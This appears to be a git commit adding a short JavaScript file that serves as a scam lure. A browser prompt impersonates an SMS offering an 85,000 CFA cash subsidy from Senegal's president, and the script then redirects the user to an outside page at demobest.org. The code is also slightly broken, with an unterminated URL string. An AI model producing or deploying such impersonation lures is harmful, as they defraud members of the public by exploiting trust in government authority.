af17ab7d596c2835cb590fa73df40517af8ec837
ekpebok <muiznurudeen46@gmail.com>
2025-03-21 09:57:45 +0100

    Create senegal-active.js

---
+++ senegal-active.js
@@ -0,0 +1,5 @@
+var password = 'RETIRER 85 000 CFA '
+password=prompt('SMS: Retirez 85 000 CFA de la subvention en espèces du Président Bassirou Diomaye Faye, cliquez sur OK pour retirer. ','RETIRER 85 000 CFA ');
+if (password != 'RETIRER 85 000 CFA ') {
+location.href='https://demobest.org/senegal.html;
+}
